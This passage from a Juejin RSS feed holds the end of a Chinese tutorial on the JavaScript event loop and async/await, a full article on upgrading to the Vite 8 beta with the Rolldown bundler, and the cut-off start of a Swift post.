<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07b98c51e5c14114a53cafe535826b78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=SAvPBNb2lYvc2Ab%2Fn6xbf7ioxoE%3D" alt="image.png" loading="lazy"/></p>
<p>上图更清晰：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23f2eaab6b4b412fb952e98695d58d25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=5WqHZK4wS1fG5sCpywOe0MmtGG4%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">例子 3：async/await 是 “优雅摸鱼” 的语法糖</h4>
<p><code>async/await</code> 本质是 <code>Promise</code> 的语法糖，相当于给摸鱼任务加了 “自动排队” 功能，先搞懂它的<strong>用法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'script start'</span>);
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async1</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">async2</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'async1 end'</span>);
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async2</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'async2 end'</span>);
}
<span class="hljs-title function_">async1</span>();
</code></pre>
<p><strong>关键规则</strong>：</p>
<ul>
<li><code>async</code>函数本身相当于 “返回 Promise 的函数”；</li>
<li><code>await fn()</code>的本质是：<strong>把<code>await</code>后面的代码，塞进了<code>fn()</code>返回的 Promise 的<code>then</code>里（也就是微任务队列）</strong> 。</li>
</ul>
<p>拿这段代码分析：</p>
<ol>
<li>
<p>同步执行<code>console.log('script start')</code> → 输出；</p>
</li>
<li>
<p>执行<code>async1()</code>：</p>
<ul>
<li>进入<code>async1</code>，遇到<code>await async2()</code> → 先执行<code>async2()</code>（同步），输出<code>async2 end</code>；</li>
<li><code>await</code>把后续的<code>console.log('async1 end')</code>扔进<strong>微任务队列</strong>；</li>
</ul>
</li>
<li>
<p>继续执行同步代码</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2e5f685dfb644eb8cf6e31815ffa81e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=UQ7AQXvtsgB6kY4%2BmbBVjAJ%2B7Fw%3D" alt="image.png" loading="lazy"/></p>
<p>OK既然知道了原理我们就<strong>实战摸鱼</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟耗时任务：向服务器要数据（宏任务）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'常规摸鱼：发接口请求（耗时 1 秒）'</span>);
            <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'接口返回数据：用户列表'</span>);
        }, <span class="hljs-number">1000</span>);
    });
}
<span class="hljs-comment">// 核心工作函数（async 标记为异步函数）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">work</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'核心工作：开始处理用户数据'</span>);
    <span class="hljs-comment">// await 相当于“等待摸鱼任务完成，再继续核心工作”</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();
    <span class="hljs-comment">// 这行代码会被扔进微任务队列，相当于“紧急摸鱼后的收尾工作”</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`核心工作：使用<span class="hljs-subst">${data}</span>完成报表`</span>);
}
<span class="hljs-comment">// 执行核心工作</span>
<span class="hljs-title function_">work</span>();
<span class="hljs-comment">// 其他同步任务</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'核心工作：处理其他紧急事务'</span>);
</code></pre>
<p><strong>摸鱼流程拆解：</strong></p>
<ol>
<li>
<p>执行同步任务：</p>
<ul>
<li>调用 <code>work()</code> 函数，打印 <code>核心工作：开始处理用户数据</code>；</li>
<li>遇到 <code>await fetchData()</code>，先执行 <code>fetchData()</code>，里面的 <code>setTimeout</code> 被扔进 “宏任务队列”（常规摸鱼）；</li>
<li><code>await</code> 会暂停 <code>work</code> 函数，跳出去执行其他同步任务，打印 <code>核心工作：处理其他紧急事务</code> → 同步任务完成。</li>
</ul>
</li>
<li>
<p>微任务队列为空，直接进入中场休息。</p>
</li>
<li>
<p>处理宏任务队列（常规摸鱼）：</p>
<ul>
<li>1 秒后，执行 <code>setTimeout</code> 回调，打印 <code>常规摸鱼：发接口请求（耗时 1 秒）</code>，<code>Promise</code> resolve 后，<code>await</code> 后面的代码被扔进 “微任务队列”。</li>
</ul>
</li>
<li>
<p>再次处理微任务队列：</p>
<ul>
<li>执行 <code>console.log(</code>核心工作：使用 ${data} 完成报表<code>)</code> → 核心工作收尾。</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f800eda7aca6422ca919d984325c3c14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=Y6YAqxXXM9cc4ntvSLSy9oob5zQ%3D" alt="image.png" loading="lazy"/></p>
<p>这里的关键是：<strong><code>await</code> 后面的代码会被自动塞进微任务队列</strong>，相当于 “摸鱼结束后，优先处理收尾工作”，不用手动写 <code>then</code> 回调，摸鱼更优雅！</p>
<p>大家可以复制代码去运行一下，时间延迟照片体现不出来~~</p>
<h3 data-id="heading-7">四、摸鱼避坑：这些误区千万别踩</h3>
<ol>
<li><strong>误区 1：setTimeout 延迟时间是 “准确时间”</strong></li>
</ol>
<p><strong>错！</strong> <code>setTimeout(() =&gt; {}, 1000)</code> 不是 “1 秒后立即执行”，而是 “1 秒后把任务扔进宏任务队列”，得等同步任务和微任务全部完成后才会执行。如果前面的任务耗时 2 秒，那摸鱼就得等 2 秒后才开始。</p>
<ol start="2">
<li><strong>误区 2：Promise 构造函数里的代码是异步的</strong></li>
</ol>
<p><strong>错！</strong> <code>new Promise((resolve) =&gt; { 同步代码 })</code> 里的代码是同步执行的，只有 <code>then</code>、<code>catch</code> 回调才是微任务（异步）。比如下面的代码，会先打印 <code>同步代码</code>，再打印 <code>微任务</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'同步代码'</span>);
    <span class="hljs-title function_">resolve</span>();
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'微任务'</span>)
});
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b15500dc5c549788cda4393bb1d0b3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=zRTeOhB4T00YBI6adwdD89Q1mDk%3D" alt="image.png" loading="lazy"/>
3. <strong>误区 3：async 函数返回值是 “原始数据”</strong></p>
<p><strong>错！</strong> <code>async</code> 函数默认返回一个 <code>Promise</code> 对象，哪怕你写 <code>async function fn() { return 1; }</code>，调用 <code>fn()</code> 得到的也是 <code>Promise { 1 }</code>，需要用 <code>await</code> 或 <code>then</code> 才能拿到值。</p>
<h3 data-id="heading-8">五、总结：Event Loop 摸鱼口诀（记熟直接用）</h3>
<p><strong>同步任务先干完，微任务队列清干净；</strong></p>
<p><strong>渲染页面歇一歇，宏任务来轮着干；</strong></p>
<p><strong>await 后藏微任务，Promise 构造是同步；</strong></p>
<p><strong>Event Loop 掌节奏，摸鱼工作两不误！</strong></p>
<h2 data-id="heading-9">结语</h2>
<p>其实 JS 单线程的 <strong>“摸鱼哲学”</strong>，本质是 <strong>“优先级管理”</strong>—— 核心工作优先做，耗时任务排队做，既不耽误事，又不浪费时间。掌握了 <code>Event Loop</code>，你不仅能看懂 JS 异步代码的执行顺序，还能写出更高效的代码，就像打工人掌握了摸鱼技巧，工作效率翻倍，摸鱼也不心慌！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite8来啦，告别 esbuild + Rollup，Vite 8 统一用 Rolldown 了]]></title>    <link>https://juejin.cn/post/7580303864604590089</link>    <guid>https://juejin.cn/post/7580303864604590089</guid>    <pubDate>2025-12-06T10:42:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580303864604590089" data-draft-id="7580277964341673994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite8来啦，告别 esbuild + Rollup，Vite 8 统一用 Rolldown 了"/> <meta itemprop="keywords" content="Vite,前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-06T10:42:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite8来啦，告别 esbuild + Rollup，Vite 8 统一用 Rolldown 了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T10:42:44.000Z" title="Sat Dec 06 2025 10:42:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db3555cd96a24a65b07866ffd17d7192~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765622564&amp;x-signature=KRtO3jpWx9vkEW%2BbZaGu64v6qcU%3D" alt="vite8.webp" loading="lazy"/></p>
<p>用 Vite 做项目的应该都有感觉：开发体验一直很顺，但生产构建这块，项目一大就开始拉胯。</p>
<p>问题出在 Vite 的双引擎架构——开发用 esbuild，生产用 Rollup。两套东西，行为不一致，偶尔还会出现"本地没问题，构建就炸"的玄学 bug。</p>
<p>12 月 3 号，Vite 8 Beta 发布了，底层换成了 Rolldown。我第一时间把手上的项目升级了，踩了几个坑，这里记录一下。</p>
<hr/>
<h2 data-id="heading-0">Rolldown 是什么</h2>
<p>简单说：一个 Rust 写的打包器，目标是同时替代 esbuild 和 Rollup。</p>
<p>尤雨溪的 VoidZero 团队搞的，拿了 1700 多万美金融资。整个工具链是这样的：</p>
<ul>
<li>Vite（构建工具）</li>
<li>Rolldown（打包器）</li>
<li>Oxc（编译器、压缩器）</li>
</ul>
<p>三个项目同一个团队维护，行为一致性有保障。</p>
<p>Rolldown 和 esbuild 速度差不多，比 Rollup 快 10-30 倍。尤雨溪自己测 Vue 核心代码的打包，Rolldown 比 Rollup 快 7 倍，比 esbuild 还快将近 2 倍。</p>
<hr/>
<h2 data-id="heading-1">真实项目数据</h2>
<p>看看早期用户的反馈：</p>






























<table><thead><tr><th>项目</th><th>构建时间变化</th><th>提升倍数</th></tr></thead><tbody><tr><td>Linear</td><td>46s → 6s</td><td>7.6x</td></tr><tr><td>Excalidraw</td><td>22.9s → 1.4s</td><td>16x</td></tr><tr><td>GitLab</td><td>2.5min → 40s</td><td>3.75x</td></tr><tr><td>Beehiiv</td><td>-</td><td>64% 更快</td></tr></tbody></table>
<p>GitLab 还有个离谱的数据：内存占用降了 100 倍。</p>
<hr/>
<h2 data-id="heading-2">升级步骤</h2>
<p>升级本身不复杂：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D vite@8.0.0-beta.0 @vitejs/plugin-vue@latest
</code></pre>
<p>Node.js 版本要求 20.19+ 或 22.12+，18 不支持了。</p>
<p>装完大概率能跑，但如果你用了 <code>manualChunks</code>，会遇到问题。</p>
<hr/>
<h2 data-id="heading-3">踩坑：manualChunks 不能用了</h2>
<p>我的项目之前用对象形式配置 chunk 分割：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 旧写法，Vite 8 直接报错</span>
<span class="hljs-attr">rollupOptions</span>: {
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">manualChunks</span>: {
      <span class="hljs-string">'vue-vendor'</span>: [<span class="hljs-string">'vue'</span>, <span class="hljs-string">'pinia'</span>],
      <span class="hljs-string">'monaco'</span>: [<span class="hljs-string">'monaco-editor'</span>],
    }
  }
}
</code></pre>
<p>跑构建直接炸：<code>TypeError: manualChunks is not a function</code></p>
<p>Rolldown 不支持对象形式的 <code>manualChunks</code>，得改成 <code>advancedChunks</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 新写法</span>
<span class="hljs-attr">rollupOptions</span>: {
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">advancedChunks</span>: {
      <span class="hljs-attr">groups</span>: [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'vue-vendor'</span>, <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](vue|pinia)[\\/]/</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'monaco'</span>, <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]monaco-editor[\\/]/</span> },
      ]
    }
  }
}
</code></pre>
<p>用正则匹配模块路径，比之前的数组形式更灵活，但迁移需要手动改一遍。</p>
<hr/>
<h2 data-id="heading-4">其他变化</h2>
<p><strong>配置项重命名</strong></p>
<p><code>build.rollupOptions</code> 以后要改成 <code>build.rolldownOptions</code>，目前还兼容但会有警告。</p>
<p><strong>CSS 压缩</strong></p>
<p>默认从 esbuild 换成了 Lightning CSS。想换回去可以设置 <code>build.cssMinify: 'esbuild'</code>。</p>
<p><strong>JS 压缩</strong></p>
<p>从 esbuild 换成了 Oxc Minifier。</p>
<p><strong>插件兼容性</strong></p>
<p>大部分 Vite 插件直接能用。少数依赖 esbuild 特定选项的需要适配。</p>
<hr/>
<h2 data-id="heading-5">开发服务器</h2>
<p>开发服务器启动速度没太大变化，本来就快。</p>
<p>但后面会有个 Full Bundle Mode，开发阶段也打包。官方初步数据：</p>
<ul>
<li>启动快 3 倍</li>
<li>热更新快 40%</li>
<li>网络请求少 10 倍</li>
</ul>
<p>大型项目福音，不过目前还没正式发布。</p>
<hr/>
<h2 data-id="heading-6">要不要升</h2>
<p>我的建议：</p>
<p><strong>现在可以升的</strong>：</p>
<ul>
<li>个人项目、实验性项目</li>
<li>构建时间已经成为痛点的大型项目</li>
<li>愿意踩坑反馈问题的</li>
</ul>
<p><strong>等等再升的</strong>：</p>
<ul>
<li>生产环境稳定性优先的项目</li>
<li>依赖大量 Rollup 特定配置的</li>
<li>等正式版发布（估计一两个月内）</li>
</ul>
<hr/>
<h2 data-id="heading-7">顺手推几个开源项目</h2>
<p>既然聊到 Vite 和前端工具链，推一下我做的几个开源项目：</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a></strong> - 双模式 AI 应用，聊天 + 富文本编辑整合在一起。技术栈刚升级到 Vue 3.5 + TypeScript + Vite 8，可以作为 Vite 8 实战参考。自己配置 API key 就能部署，支持导出 PDF、DOCX、Markdown。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">code-review-skill</a></strong> - Claude Code 的代码审查技能，覆盖 React 19、Vue 3、Rust、TypeScript 等主流技术栈。采用按需加载设计，审查 React 代码时只加载 React 相关规则，不浪费 token。大概 9000 行最佳实践。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">5-whys-skill</a></strong> - "5 个为什么"根因分析技能。遇到 bug 或者系统问题时，说"找根因"就能自动激活，输出结构化的分析报告。排查问题挺好用的。</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">first-principles-skill</a></strong> - 第一性原理思考技能，适合架构设计和技术方案选型。不是套模板，是真的帮你拆解问题本质。</p>
<p>感兴趣的可以去 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a> 看看。</p>
<hr/>
<h2 data-id="heading-8">相关链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fblog%2Fannouncing-vite8-beta" target="_blank" title="https://vite.dev/blog/announcing-vite8-beta" ref="nofollow noopener noreferrer">Vite 8 Beta 公告</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmain.vite.dev%2Fguide%2Fmigration" target="_blank" title="https://main.vite.dev/guide/migration" ref="nofollow noopener noreferrer">迁移指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fguide%2Frolldown" target="_blank" title="https://vite.dev/guide/rolldown" ref="nofollow noopener noreferrer">Rolldown 集成文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2F" target="_blank" title="https://voidzero.dev/" ref="nofollow noopener noreferrer">VoidZero</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift 疑难杂想]]></title>    <link>https://juejin.cn/post/7580303864604393481</link>    <guid>https://juejin.cn/post/7580303864604393481</guid>    <pubDate>2025-12-06T08:50:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580303864604393481" data-draft-id="7580280096059408411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift 疑难杂想"/> <meta itemprop="keywords" content="SwiftUI"/> <meta itemprop="datePublished" content="2025-12-06T08:50:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Neo_Arsaka"/> <meta itemprop="url" content="https://juejin.cn/user/1955363207515927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift 疑难杂想
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1955363207515927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Neo_Arsaka
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:50:26.000Z" title="Sat Dec 06 2025 08:50:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 